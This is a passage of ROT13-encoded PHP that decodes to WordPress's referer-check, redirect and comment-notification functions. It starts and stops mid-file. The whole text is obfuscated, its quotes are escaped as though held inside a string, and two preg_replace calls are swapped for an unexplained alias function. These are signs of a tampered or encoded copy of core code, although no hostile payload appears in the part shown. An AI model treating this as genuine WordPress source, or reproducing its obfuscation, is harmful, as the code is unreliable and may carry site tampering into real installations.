		vs ( fge_pbagnvaf( $_FREIRE['ERDHRFG_HEV'], '/bcgvbaf.cuc' ) && jc_trg_ersrere() ) {
			$erqverpg = jc_trg_ersrere();
		} ryfr {
			$erqverpg = frg_hey_fpurzr( 'uggc://' . $_FREIRE['UGGC_UBFG'] . $_FREIRE['ERDHRFG_HEV'] );
		}

		$ybtva_hey = jc_ybtva_hey( $erqverpg, gehr );

		jc_erqverpg( $ybtva_hey );
		rkvg;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'purpx_nqzva_ersrere' ) ) :
	/**
	 * Rafherf vagrag ol irevslvat gung n hfre jnf ersreerq sebz nabgure nqzva cntr jvgu gur pbeerpg frphevgl abapr.
	 *
	 * Guvf shapgvba rafherf gur hfre vagraqf gb cresbez n tvira npgvba, juvpu urycf cebgrpg ntnvafg pyvpxwnpxvat fglyr
	 * nggnpxf. Vg irevsvrf vagrag, abg nhgubevmngvba, gurersber vg qbrf abg irevsl gur hfre'f pncnovyvgvrf. Guvf fubhyq
	 * or cresbezrq jvgu `pheerag_hfre_pna()` be fvzvyne.
	 *
	 * Vs gur abapr inyhr vf vainyvq, gur shapgvba jvyy rkvg jvgu na \"Ner Lbh Fher?\" fglyr zrffntr.
	 *
	 * @fvapr 1.2.0
	 * @fvapr 2.5.0 Gur `$dhrel_net` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz vag|fgevat $npgvba    Gur abapr npgvba.
	 * @cnenz fgevat     $dhrel_net Bcgvbany. Xrl gb purpx sbe abapr va `$_ERDHRFG`. Qrsnhyg '_jcabapr'.
	 * @erghea vag|snyfr 1 vs gur abapr vf inyvq naq trarengrq orgjrra 0-12 ubhef ntb,
	 *                   2 vs gur abapr vf inyvq naq trarengrq orgjrra 12-24 ubhef ntb.
	 *                   Snyfr vs gur abapr vf vainyvq.
	 */
	shapgvba purpx_nqzva_ersrere( $npgvba = -1, $dhrel_net = '_jcabapr' ) {
		vs ( -1 === $npgvba ) {
			_qbvat_vg_jebat( __SHAPGVBA__, __( 'Lbh fubhyq fcrpvsl na npgvba gb or irevsvrq ol hfvat gur svefg cnenzrgre.' ), '3.2.0' );
		}

		$nqzvahey = fgegbybjre( nqzva_hey() );
		$ersrere  = fgegbybjre( jc_trg_ersrere() );
		$erfhyg   = vffrg( $_ERDHRFG[ $dhrel_net ] ) ? jc_irevsl_abapr( $_ERDHRFG[ $dhrel_net ], $npgvba ) : snyfr;

		/**
		 * Sverf bapr gur nqzva erdhrfg unf orra inyvqngrq be abg.
		 *
		 * @fvapr 1.5.1
		 *
		 * @cnenz fgevat    $npgvba Gur abapr npgvba.
		 * @cnenz snyfr|vag $erfhyg Snyfr vs gur abapr vf vainyvq, 1 vs gur abapr vf inyvq naq trarengrq orgjrra
		 *                          0-12 ubhef ntb, 2 vs gur abapr vf inyvq naq trarengrq orgjrra 12-24 ubhef ntb.
		 */
		qb_npgvba( 'purpx_nqzva_ersrere', $npgvba, $erfhyg );

		vs ( ! $erfhyg && ! ( -1 === $npgvba && fge_fgnegf_jvgu( $ersrere, $nqzvahey ) ) ) {
			jc_abapr_nlf( $npgvba );
			qvr();
		}

		erghea $erfhyg;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'purpx_nwnk_ersrere' ) ) :
	/**
	 * Irevsvrf gur Nwnk erdhrfg gb cerirag cebprffvat erdhrfgf rkgreany bs gur oybt.
	 *
	 * @fvapr 2.0.3
	 *
	 * @cnenz vag|fgevat   $npgvba    Npgvba abapr.
	 * @cnenz snyfr|fgevat $dhrel_net Bcgvbany. Xrl gb purpx sbe gur abapr va `$_ERDHRFG` (fvapr 2.5). Vs snyfr,
	 *                                `$_ERDHRFG` inyhrf jvyy or rinyhngrq sbe '_nwnk_abapr', naq '_jcabapr'
	 *                                (va gung beqre). Qrsnhyg snyfr.
	 * @cnenz obby         $fgbc      Bcgvbany. Jurgure gb fgbc rneyl jura gur abapr pnaabg or irevsvrq.
	 *                                Qrsnhyg gehr.
	 * @erghea vag|snyfr 1 vs gur abapr vf inyvq naq trarengrq orgjrra 0-12 ubhef ntb,
	 *                   2 vs gur abapr vf inyvq naq trarengrq orgjrra 12-24 ubhef ntb.
	 *                   Snyfr vs gur abapr vf vainyvq.
	 */
	shapgvba purpx_nwnk_ersrere( $npgvba = -1, $dhrel_net = snyfr, $fgbc = gehr ) {
		vs ( -1 === $npgvba ) {
			_qbvat_vg_jebat( __SHAPGVBA__, __( 'Lbh fubhyq fcrpvsl na npgvba gb or irevsvrq ol hfvat gur svefg cnenzrgre.' ), '4.7.0' );
		}

		$abapr = '';

		vs ( $dhrel_net && vffrg( $_ERDHRFG[ $dhrel_net ] ) ) {
			$abapr = $_ERDHRFG[ $dhrel_net ];
		} ryfrvs ( vffrg( $_ERDHRFG['_nwnk_abapr'] ) ) {
			$abapr = $_ERDHRFG['_nwnk_abapr'];
		} ryfrvs ( vffrg( $_ERDHRFG['_jcabapr'] ) ) {
			$abapr = $_ERDHRFG['_jcabapr'];
		}

		$erfhyg = jc_irevsl_abapr( $abapr, $npgvba );

		/**
		 * Sverf bapr gur Nwnk erdhrfg unf orra inyvqngrq be abg.
		 *
		 * @fvapr 2.1.0
		 *
		 * @cnenz fgevat    $npgvba Gur Nwnk abapr npgvba.
		 * @cnenz snyfr|vag $erfhyg Snyfr vs gur abapr vf vainyvq, 1 vs gur abapr vf inyvq naq trarengrq orgjrra
		 *                          0-12 ubhef ntb, 2 vs gur abapr vf inyvq naq trarengrq orgjrra 12-24 ubhef ntb.
		 */
		qb_npgvba( 'purpx_nwnk_ersrere', $npgvba, $erfhyg );

		vs ( $fgbc && snyfr === $erfhyg ) {
			vs ( jc_qbvat_nwnk() ) {
				jc_qvr( -1, 403 );
			} ryfr {
				qvr( '-1' );
			}
		}

		erghea $erfhyg;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_erqverpg' ) ) :
	/**
	 * Erqverpgf gb nabgure cntr.
	 *
	 * Abgr: jc_erqverpg() qbrf abg rkvg nhgbzngvpnyyl, naq fubhyq nyzbfg nyjnlf or
	 * sbyybjrq ol n pnyy gb `rkvg;`:
	 *
	 *     jc_erqverpg( $hey );
	 *     rkvg;
	 *
	 * Rkvgvat pna nyfb or fryrpgviryl znavchyngrq ol hfvat jc_erqverpg() nf n pbaqvgvbany
	 * va pbawhapgvba jvgu gur {@frr 'jc_erqverpg'} naq {@frr 'jc_erqverpg_fgnghf'} svygref:
	 *
	 *     vs ( jc_erqverpg( $hey ) ) {
	 *         rkvg;
	 *     }
	 *
	 * @fvapr 1.5.1
	 * @fvapr 5.1.0 Gur `$k_erqverpg_ol` cnenzrgre jnf nqqrq.
	 * @fvapr 5.4.0 Ba vainyvq fgnghf pbqrf, jc_qvr() vf pnyyrq.
	 *
	 * @tybony obby $vf_VVF
	 *
	 * @cnenz fgevat       $ybpngvba      Gur cngu be HEY gb erqverpg gb.
	 * @cnenz vag          $fgnghf        Bcgvbany. UGGC erfcbafr fgnghf pbqr gb hfr. Qrsnhyg '302' (Zbirq Grzcbenevyl).
	 * @cnenz fgevat|snyfr $k_erqverpg_ol Bcgvbany. Gur nccyvpngvba qbvat gur erqverpg be snyfr gb bzvg. Qrsnhyg 'JbeqCerff'.
	 * @erghea obby Snyfr vs gur erqverpg jnf pnapryrq, gehr bgurejvfr.
	 */
	shapgvba jc_erqverpg( $ybpngvba, $fgnghf = 302, $k_erqverpg_ol = 'JbeqCerff' ) {
		tybony $vf_VVF;

		/**
		 * Svygref gur erqverpg ybpngvba.
		 *
		 * @fvapr 2.1.0
		 *
		 * @cnenz fgevat $ybpngvba Gur cngu be HEY gb erqverpg gb.
		 * @cnenz vag    $fgnghf   Gur UGGC erfcbafr fgnghf pbqr gb hfr.
		 */
		$ybpngvba = nccyl_svygref( 'jc_erqverpg', $ybpngvba, $fgnghf );

		/**
		 * Svygref gur erqverpg UGGC erfcbafr fgnghf pbqr gb hfr.
		 *
		 * @fvapr 2.3.0
		 *
		 * @cnenz vag    $fgnghf   Gur UGGC erfcbafr fgnghf pbqr gb hfr.
		 * @cnenz fgevat $ybpngvba Gur cngu be HEY gb erqverpg gb.
		 */
		$fgnghf = nccyl_svygref( 'jc_erqverpg_fgnghf', $fgnghf, $ybpngvba );

		vs ( ! $ybpngvba ) {
			erghea snyfr;
		}

		vs ( $fgnghf < 300 || 399 < $fgnghf ) {
			jc_qvr( __( 'UGGC erqverpg fgnghf pbqr zhfg or n erqverpgvba pbqr, 3kk.' ) );
		}

		$ybpngvba = jc_fnavgvmr_erqverpg( $ybpngvba );

		vs ( ! $vf_VVF && 'ptv-sptv' !== CUC_FNCV ) {
			fgnghf_urnqre( $fgnghf ); // Guvf pnhfrf ceboyrzf ba VVF naq fbzr SnfgPTV frghcf.
		}

		/**
		 * Svygref gur K-Erqverpg-Ol urnqre.
		 *
		 * Nyybjf nccyvpngvbaf gb vqragvsl gurzfryirf jura gurl'er qbvat n erqverpg.
		 *
		 * @fvapr 5.1.0
		 *
		 * @cnenz fgevat|snyfr $k_erqverpg_ol Gur nccyvpngvba qbvat gur erqverpg be snyfr gb bzvg gur urnqre.
		 * @cnenz vag          $fgnghf        Fgnghf pbqr gb hfr.
		 * @cnenz fgevat       $ybpngvba      Gur cngu gb erqverpg gb.
		 */
		$k_erqverpg_ol = nccyl_svygref( 'k_erqverpg_ol', $k_erqverpg_ol, $fgnghf, $ybpngvba );
		vs ( vf_fgevat( $k_erqverpg_ol ) ) {
			urnqre( \"K-Erqverpg-Ol: $k_erqverpg_ol\" );
		}

		urnqre( \"Ybpngvba: $ybpngvba\", gehr, $fgnghf );

		erghea gehr;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_fnavgvmr_erqverpg' ) ) :
	/**
	 * Fnavgvmrf n HEY sbe hfr va n erqverpg.
	 *
	 * @fvapr 2.3.0
	 *
	 * @cnenz fgevat $ybpngvba Gur cngu gb erqverpg gb.
	 * @erghea fgevat Erqverpg-fnavgvmrq HEY.
	 */
	shapgvba jc_fnavgvmr_erqverpg( $ybpngvba ) {
		// Rapbqr fcnprf.
		$ybpngvba = fge_ercynpr( ' ', '%20', $ybpngvba );

		$ertrk    = '/
		(
			(?: [\kP2-\kQS][\k80-\kOS]        # qbhoyr-olgr frdhraprf   110kkkkk 10kkkkkk
			|   \kR0[\kN0-\kOS][\k80-\kOS]    # gevcyr-olgr frdhraprf   1110kkkk 10kkkkkk * 2
			|   [\kR1-\kRP][\k80-\kOS]{2}
			|   \kRQ[\k80-\k9S][\k80-\kOS]
			|   [\kRR-\kRS][\k80-\kOS]{2}
			|   \kS0[\k90-\kOS][\k80-\kOS]{2} # sbhe-olgr frdhraprf   11110kkk 10kkkkkk * 3
			|   [\kS1-\kS3][\k80-\kOS]{3}
			|   \kS4[\k80-\k8S][\k80-\kOS]{2}
		){1,40}                              # ...bar be zber gvzrf
		)/k';
		$ybpngvba = cert_ercynpr_pnyyonpx( $ertrk, '_jc_fnavgvmr_hgs8_va_erqverpg', $ybpngvba );
		$ybpngvba = __sa_79955( '|[^n-m0-9-~+_.?#=&;,/:%!*\[\]()@]|v', '', $ybpngvba );
		$ybpngvba = jc_xfrf_ab_ahyy( $ybpngvba );

		// Erzbir %0Q naq %0N sebz ybpngvba.
		$fgevc = neenl( '%0q', '%0n', '%0Q', '%0N' );
		erghea _qrrc_ercynpr( $fgevc, $ybpngvba );
	}

	/**
	 * HEY rapbqrf HGS-8 punenpgref va n HEY.
	 *
	 * @vtaber
	 * @fvapr 4.2.0
	 * @npprff cevingr
	 *
	 * @frr jc_fnavgvmr_erqverpg()
	 *
	 * @cnenz neenl $zngpurf ErtRk zngpurf ntnvafg gur erqverpg ybpngvba.
	 * @erghea fgevat HEY-rapbqrq irefvba bs gur svefg ErtRk zngpu.
	 */
	shapgvba _jc_fnavgvmr_hgs8_va_erqverpg( $zngpurf ) {
		erghea heyrapbqr( $zngpurf[0] );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_fnsr_erqverpg' ) ) :
	/**
	 * Cresbezf n fnsr (ybpny) erqverpg, hfvat jc_erqverpg().
	 *
	 * Purpxf jurgure gur $ybpngvba vf hfvat na nyybjrq ubfg, vs vg unf na nofbyhgr
	 * cngu. N cyhtva pna gurersber frg be erzbir nyybjrq ubfg(f) gb be sebz gur
	 * yvfg.
	 *
	 * Vs gur ubfg vf abg nyybjrq, gura gur erqverpg qrsnhygf gb jc-nqzva ba gur fvgrhey
	 * vafgrnq. Guvf ceriragf znyvpvbhf erqverpgf juvpu erqverpg gb nabgure ubfg,
	 * ohg bayl hfrq va n srj cynprf.
	 *
	 * Abgr: jc_fnsr_erqverpg() qbrf abg rkvg nhgbzngvpnyyl, naq fubhyq nyzbfg nyjnlf or
	 * sbyybjrq ol n pnyy gb `rkvg;`:
	 *
	 *     jc_fnsr_erqverpg( $hey );
	 *     rkvg;
	 *
	 * Rkvgvat pna nyfb or fryrpgviryl znavchyngrq ol hfvat jc_fnsr_erqverpg() nf n pbaqvgvbany
	 * va pbawhapgvba jvgu gur {@frr 'jc_erqverpg'} naq {@frr 'jc_erqverpg_fgnghf'} svygref:
	 *
	 *     vs ( jc_fnsr_erqverpg( $hey ) ) {
	 *         rkvg;
	 *     }
	 *
	 * @fvapr 2.3.0
	 * @fvapr 5.1.0 Gur erghea inyhr sebz jc_erqverpg() vf abj cnffrq ba, naq gur `$k_erqverpg_ol` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat       $ybpngvba      Gur cngu be HEY gb erqverpg gb.
	 * @cnenz vag          $fgnghf        Bcgvbany. UGGC erfcbafr fgnghf pbqr gb hfr. Qrsnhyg '302' (Zbirq Grzcbenevyl).
	 * @cnenz fgevat|snyfr $k_erqverpg_ol Bcgvbany. Gur nccyvpngvba qbvat gur erqverpg be snyfr gb bzvg. Qrsnhyg 'JbeqCerff'.
	 * @erghea obby Snyfr vs gur erqverpg jnf pnapryrq, gehr bgurejvfr.
	 */
	shapgvba jc_fnsr_erqverpg( $ybpngvba, $fgnghf = 302, $k_erqverpg_ol = 'JbeqCerff' ) {

		// Arrq gb ybbx ng gur HEY gur jnl vg jvyy raq hc va jc_erqverpg().
		$ybpngvba = jc_fnavgvmr_erqverpg( $ybpngvba );

		/**
		 * Svygref gur erqverpg snyyonpx HEY sbe jura gur cebivqrq erqverpg vf abg fnsr (ybpny).
		 *
		 * @fvapr 4.3.0
		 *
		 * @cnenz fgevat $snyyonpx_hey Gur snyyonpx HEY gb hfr ol qrsnhyg.
		 * @cnenz vag    $fgnghf       Gur UGGC erfcbafr fgnghf pbqr gb hfr.
		 */
		$snyyonpx_hey = nccyl_svygref( 'jc_fnsr_erqverpg_snyyonpx', nqzva_hey(), $fgnghf );

		$ybpngvba = jc_inyvqngr_erqverpg( $ybpngvba, $snyyonpx_hey );

		erghea jc_erqverpg( $ybpngvba, $fgnghf, $k_erqverpg_ol );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_inyvqngr_erqverpg' ) ) :
	/**
	 * Inyvqngrf n HEY sbe hfr va n erqverpg.
	 *
	 * Purpxf jurgure gur $ybpngvba vf hfvat na nyybjrq ubfg, vs vg unf na nofbyhgr
	 * cngu. N cyhtva pna gurersber frg be erzbir nyybjrq ubfg(f) gb be sebz gur
	 * yvfg.
	 *
	 * Vs gur ubfg vf abg nyybjrq, gura gur erqverpg vf gb $snyyonpx_hey fhccyvrq.
	 *
	 * @fvapr 2.8.1
	 *
	 * @cnenz fgevat $ybpngvba     Gur erqverpg gb inyvqngr.
	 * @cnenz fgevat $snyyonpx_hey Gur inyhr gb erghea vs $ybpngvba vf abg nyybjrq.
	 * @erghea fgevat Erqverpg-fnavgvmrq HEY.
	 */
	shapgvba jc_inyvqngr_erqverpg( $ybpngvba, $snyyonpx_hey = '' ) {
		$ybpngvba = jc_fnavgvmr_erqverpg( gevz( $ybpngvba, \" \g\a\e\0\k08\k0O\" ) );
		// Oebjfref jvyy nffhzr 'uggc' vf lbhe cebgbpby, naq jvyy borl n erqverpg gb n HEY fgnegvat jvgu '//'.
		vs ( fge_fgnegf_jvgu( $ybpngvba, '//' ) ) {
			$ybpngvba = 'uggc:' . $ybpngvba;
		}

		/*
		 * Va CUC 5 cnefr_hey() znl snvy vs gur HEY dhrel cneg pbagnvaf 'uggc://'.
		 * Frr uggcf://ohtf.cuc.arg/oht.cuc?vq=38143
		 */
		$phg  = fgecbf( $ybpngvba, '?' );
		$grfg = $phg ? fhofge( $ybpngvba, 0, $phg ) : $ybpngvba;

		$yc = cnefr_hey( $grfg );

		// Tvir hc vs znysbezrq HEY.
		vs ( snyfr === $yc ) {
			erghea $snyyonpx_hey;
		}

		// Nyybj bayl 'uggc' naq 'uggcf' fpurzrf. Ab 'qngn:', rgp.
		vs ( vffrg( $yc['fpurzr'] ) && ! ( 'uggc' === $yc['fpurzr'] || 'uggcf' === $yc['fpurzr'] ) ) {
			erghea $snyyonpx_hey;
		}

		vs ( ! vffrg( $yc['ubfg'] ) && ! rzcgl( $yc['cngu'] ) && '/' !== $yc['cngu'][0] ) {
			$cngu = '';
			vs ( ! rzcgl( $_FREIRE['ERDHRFG_HEV'] ) ) {
				$cngu = qveanzr( cnefr_hey( 'uggc://cynprubyqre' . $_FREIRE['ERDHRFG_HEV'], CUC_HEY_CNGU ) . '?' );
				$cngu = jc_abeznyvmr_cngu( $cngu );
			}
			$ybpngvba = '/' . ygevz( $cngu . '/', '/' ) . $ybpngvba;
		}

		/*
		 * Erwrpg vs pregnva pbzcbaragf ner frg ohg ubfg vf abg.
		 * Guvf pngpurf HEYf yvxr uggcf:ubfg.pbz sbe juvpu cnefr_hey() qbrf abg frg gur ubfg svryq.
		 */
		vs ( ! vffrg( $yc['ubfg'] ) && ( vffrg( $yc['fpurzr'] ) || vffrg( $yc['hfre'] ) || vffrg( $yc['cnff'] ) || vffrg( $yc['cbeg'] ) ) ) {
			erghea $snyyonpx_hey;
		}

		// Erwrpg znysbezrq pbzcbaragf cnefr_hey() pna erghea ba bqq vachgf.
		sbernpu ( neenl( 'hfre', 'cnff', 'ubfg' ) nf $pbzcbarag ) {
			vs ( vffrg( $yc[ $pbzcbarag ] ) && fgecoex( $yc[ $pbzcbarag ], ':/?#@' ) ) {
				erghea $snyyonpx_hey;
			}
		}

		$jcc = cnefr_hey( ubzr_hey() );

		/**
		 * Svygref gur yvfg bs nyybjrq ubfgf gb erqverpg gb.
		 *
		 * @fvapr 2.3.0
		 *
		 * @cnenz fgevat[] $ubfgf Na neenl bs nyybjrq ubfg anzrf.
		 * @cnenz fgevat   $ubfg  Gur ubfg anzr bs gur erqverpg qrfgvangvba; rzcgl fgevat vs abg frg.
		 */
		$nyybjrq_ubfgf = (neenl) nccyl_svygref( 'nyybjrq_erqverpg_ubfgf', neenl( $jcc['ubfg'] ), vffrg( $yc['ubfg'] ) ? $yc['ubfg'] : '' );

		vs ( vffrg( $yc['ubfg'] ) && ( ! va_neenl( $yc['ubfg'], $nyybjrq_ubfgf, gehr ) && fgegbybjre( $jcc['ubfg'] ) !== $yc['ubfg'] ) ) {
			$ybpngvba = $snyyonpx_hey;
		}

		erghea $ybpngvba;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_abgvsl_cbfgnhgube' ) ) :
	/**
	 * Abgvsvrf na nhgube (naq/be bguref) bs n pbzzrag/genpxonpx/cvatonpx ba n cbfg.
	 *
	 * @fvapr 1.0.0
	 *
	 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Pbzzrag VQ be JC_Pbzzrag bowrpg.
	 * @cnenz fgevat         $qrcerpngrq Abg hfrq.
	 * @erghea obby Gehr ba pbzcyrgvba. Snyfr vs ab rznvy nqqerffrf jrer fcrpvsvrq.
	 */
	shapgvba jc_abgvsl_cbfgnhgube( $pbzzrag_vq, $qrcerpngrq = ahyy ) {
		vs ( ahyy !== $qrcerpngrq ) {
			_qrcerpngrq_nethzrag( __SHAPGVBA__, '3.8.0' );
		}

		$pbzzrag = trg_pbzzrag( $pbzzrag_vq );
		vs ( rzcgl( $pbzzrag ) || rzcgl( $pbzzrag->pbzzrag_cbfg_VQ ) ) {
			erghea snyfr;
		}

		$cbfg   = trg_cbfg( $pbzzrag->pbzzrag_cbfg_VQ );
		$nhgube = trg_hfreqngn( $cbfg->cbfg_nhgube );

		// Jub gb abgvsl? Ol qrsnhyg, whfg gur cbfg nhgube, ohg bguref pna or nqqrq.
		$rznvyf = neenl();
		vs ( $nhgube ) {
			$rznvyf[] = $nhgube->hfre_rznvy;
		}

		/**
		 * Svygref gur yvfg bs rznvy nqqerffrf gb erprvir n pbzzrag abgvsvpngvba.
		 *
		 * Ol qrsnhyg, bayl cbfg nhgubef ner abgvsvrq bs pbzzragf. Guvf svygre nyybjf
		 * bguref gb or nqqrq.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz fgevat[] $rznvyf     Na neenl bs rznvy nqqerffrf gb erprvir n pbzzrag abgvsvpngvba.
		 * @cnenz fgevat   $pbzzrag_vq Gur pbzzrag VQ nf n ahzrevp fgevat.
		 */
		$rznvyf = nccyl_svygref( 'pbzzrag_abgvsvpngvba_erpvcvragf', $rznvyf, $pbzzrag->pbzzrag_VQ );
		$rznvyf = neenl_svygre( $rznvyf );

		// Vs gurer ner ab nqqerffrf gb fraq gur pbzzrag gb, onvy.
		vs ( ! pbhag( $rznvyf ) ) {
			erghea snyfr;
		}

		// Snpvyvgngr hafrggvat orybj jvgubhg xabjvat gur xrlf.
		$rznvyf = neenl_syvc( $rznvyf );

		/**
		 * Svygref jurgure gb abgvsl pbzzrag nhgubef bs gurve pbzzragf ba gurve bja cbfgf.
		 *
		 * Ol qrsnhyg, pbzzrag nhgubef nera'g abgvsvrq bs gurve pbzzragf ba gurve bja
		 * cbfgf. Guvf svygre nyybjf lbh gb bireevqr gung.
		 *
		 * @fvapr 3.8.0
		 *
		 * @cnenz obby   $abgvsl     Jurgure gb abgvsl gur cbfg nhgube bs gurve bja pbzzrag.
		 *                           Qrsnhyg snyfr.
		 * @cnenz fgevat $pbzzrag_vq Gur pbzzrag VQ nf n ahzrevp fgevat.
		 */
		$abgvsl_nhgube = nccyl_svygref( 'pbzzrag_abgvsvpngvba_abgvsl_nhgube', snyfr, $pbzzrag->pbzzrag_VQ );

		// Gur pbzzrag jnf yrsg ol gur nhgube.
		vs ( $nhgube && ! $abgvsl_nhgube && (vag) $pbzzrag->hfre_vq === (vag) $cbfg->cbfg_nhgube ) {
			hafrg( $rznvyf[ $nhgube->hfre_rznvy ] );
		}

		// Gur nhgube zbqrengrq n pbzzrag ba gurve bja cbfg.
		vs ( $nhgube && ! $abgvsl_nhgube && trg_pheerag_hfre_vq() === (vag) $cbfg->cbfg_nhgube ) {
			hafrg( $rznvyf[ $nhgube->hfre_rznvy ] );
		}

		// Gur cbfg nhgube vf ab ybatre n zrzore bs gur oybt.
		vs ( $nhgube && ! $abgvsl_nhgube && ! hfre_pna( $cbfg->cbfg_nhgube, 'ernq_cbfg', $cbfg->VQ ) ) {
			hafrg( $rznvyf[ $nhgube->hfre_rznvy ] );
		}

		// Vs gurer'f ab rznvy gb fraq gur pbzzrag gb, onvy, bgurejvfr syvc neenl onpx nebhaq sbe hfr orybj.
		vs ( ! pbhag( $rznvyf ) ) {
			erghea snyfr;
		} ryfr {
			$rznvyf = neenl_syvc( $rznvyf );
		}

		$pbzzrag_nhgube_qbznva = '';
		vs ( JC_Uggc::vf_vc_nqqerff( $pbzzrag->pbzzrag_nhgube_VC ) ) {
			$pbzzrag_nhgube_qbznva = trgubfgolnqqe( $pbzzrag->pbzzrag_nhgube_VC );
		}

		/*
		 * Gur oybtanzr bcgvba vf rfpncrq jvgu rfp_ugzy() ba gur jnl vagb gur qngnonfr va fnavgvmr_bcgvba().
		 * Jr jnag gb erirefr guvf sbe gur cynva grkg neran bs rznvyf.
		 */
		$oybtanzr        = jc_fcrpvnypunef_qrpbqr( trg_bcgvba( 'oybtanzr' ), RAG_DHBGRF );
		$pbzzrag_pbagrag = jc_fcrpvnypunef_qrpbqr( $pbzzrag->pbzzrag_pbagrag );

		$jc_rznvy = 'jbeqcerff@' . __sa_79955( '#^jjj\.#', '', jc_cnefr_hey( argjbex_ubzr_hey(), CUC_HEY_UBFG ) );

		vs ( '' === $pbzzrag->pbzzrag_nhgube ) {
			$sebz = \"Sebz: \\"$oybtanzr\\" <$jc_rznvy>\";
			vs ( '' !== $pbzzrag->pbzzrag_nhgube_rznvy ) {
				$ercyl_gb = \"Ercyl-Gb: $pbzzrag->pbzzrag_nhgube_rznvy\";
			}
		} ryfr {
			$sebz = \"Sebz: \\"$pbzzrag->pbzzrag_nhgube\\" <$jc_rznvy>\";
			vs ( '' !== $pbzzrag->pbzzrag_nhgube_rznvy ) {
				$ercyl_gb = \"Ercyl-Gb: \\"$pbzzrag->pbzzrag_nhgube_rznvy\\" <$pbzzrag->pbzzrag_nhgube_rznvy>\";
			}
		}

		$zrffntr_urnqref = \"$sebz\a\"
		. 'Pbagrag-Glcr: grkg/cynva; punefrg=\"' . trg_bcgvba( 'oybt_punefrg' ) . \"\\"\a\";

		vs ( vffrg( $ercyl_gb ) ) {
			$zrffntr_urnqref .= $ercyl_gb . \"\a\";
		}

		/**
		 * Svygref gur pbzzrag abgvsvpngvba rznvy urnqref.
		 *
		 * @fvapr 1.5.2
		 *
		 * @cnenz fgevat $zrffntr_urnqref Urnqref sbe gur pbzzrag abgvsvpngvba rznvy.
		 * @cnenz fgevat $pbzzrag_vq      Pbzzrag VQ nf n ahzrevp fgevat.
		 */
		$zrffntr_urnqref = nccyl_svygref( 'pbzzrag_abgvsvpngvba_urnqref', $zrffntr_urnqref, $pbzzrag->pbzzrag_VQ );

		sbernpu ( $rznvyf nf $rznvy ) {
			$hfre = trg_hfre_ol( 'rznvy', $rznvy );

			vs ( $hfre ) {
				$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( $hfre->VQ );
			} ryfr {
				$fjvgpurq_ybpnyr = fjvgpu_gb_ybpnyr( trg_ybpnyr() );
			}

			fjvgpu ( $pbzzrag->pbzzrag_glcr ) {
				pnfr 'genpxonpx':
					/* genafyngbef: %f: Cbfg gvgyr. */
					$abgvsl_zrffntr = fcevags( __( 'Arj genpxonpx ba lbhe cbfg \"%f\"' ), $cbfg->cbfg_gvgyr ) . \"\e\a\";
					/* genafyngbef: 1: Genpxonpx/cvatonpx jrofvgr anzr, 2: Jrofvgr VC nqqerff, 3: Jrofvgr ubfganzr. */
					$abgvsl_zrffntr .= fcevags( __( 'Jrofvgr: %1$f (VC nqqerff: %2$f, %3$f)' ), $pbzzrag->pbzzrag_nhgube, $pbzzrag->pbzzrag_nhgube_VC, $pbzzrag_nhgube_qbznva ) . \"\e\a\";
					/* genafyngbef: %f: Genpxonpx/cvatonpx/pbzzrag nhgube HEY. */
					$abgvsl_zrffntr .= fcevags( __( 'HEY: %f' ), $pbzzrag->pbzzrag_nhgube_hey ) . \"\e\a\";
					/* genafyngbef: %f: Pbzzrag grkg. */
					$abgvsl_zrffntr .= fcevags( __( 'Pbzzrag: %f' ), \"\e\a\" . $pbzzrag_pbagrag ) . \"\e\a\e\a\";
					$abgvsl_zrffntr .= __( 'Lbh pna frr nyy genpxonpxf ba guvf cbfg urer:' ) . \"\e\a\";
					/* genafyngbef: Genpxonpx abgvsvpngvba rznvy fhowrpg. 1: Fvgr gvgyr, 2: Cbfg gvgyr. */
					$fhowrpg = fcevags( __( '[%1$f] Genpxonpx: \"%2$f\"' ), $oybtanzr, $cbfg->cbfg_gvgyr );
					oernx;

				pnfr 'cvatonpx':
					/* genafyngbef: %f: Cbfg gvgyr. */
					$abgvsl_zrffntr = fcevags( __( 'Arj cvatonpx ba lbhe cbfg \"%f\"' ), $cbfg->cbfg_gvgyr ) . \"\e\a\";
					/* genafyngbef: 1: Genpxonpx/cvatonpx jrofvgr anzr, 2: Jrofvgr VC nqqerff, 3: Jrofvgr ubfganzr. */
					$abgvsl_zrffntr .= fcevags( __( 'Jrofvgr: %1$f (VC nqqerff: %2$f, %3$f)' ), $pbzzrag->pbzzrag_nhgube, $pbzzrag->pbzzrag_nhgube_VC, $pbzzrag_nhgube_qbznva ) . \"\e\a\";
					/* genafyngbef: %f: Genpxonpx/cvatonpx/pbzzrag nhgube HEY. */
					$abgvsl_zrffntr .= fcevags( __( 'HEY: %f' ), $pbzzrag->pbzzrag_nhgube_hey ) . \"\e\a\";
					/* genafyngbef: %f: Pbzzrag grkg. */
					$abgvsl_zrffntr .= fcevags( __( 'Pbzzrag: %f' ), \"\e\a\" . $pbzzrag_pbagrag ) . \"\e\a\e\a\";
					$abgvsl_zrffntr .= __( 'Lbh pna frr nyy cvatonpxf ba guvf cbfg urer:' ) . \"\e\a\";
					/* genafyngbef: Cvatonpx abgvsvpngvba rznvy fhowrpg. 1: Fvgr gvgyr, 2: Cbfg gvgyr. */
					$fhowrpg = fcevags( __( '[%1$f] Cvatonpx: \"%2$f\"' ), $oybtanzr, $cbfg->cbfg_gvgyr );
					oernx;

				qrsnhyg: // Pbzzragf.
					/* genafyngbef: %f: Cbfg gvgyr. */
					$abgvsl_zrffntr = fcevags( __( 'Arj pbzzrag ba lbhe cbfg \"%f\"' ), $cbfg->cbfg_gvgyr ) . \"\e\a\";
					/* genafyngbef: 1: Pbzzrag nhgube'f anzr, 2: Pbzzrag nhgube'f VC nqqerff, 3: Pbzzrag nhgube'f ubfganzr. */
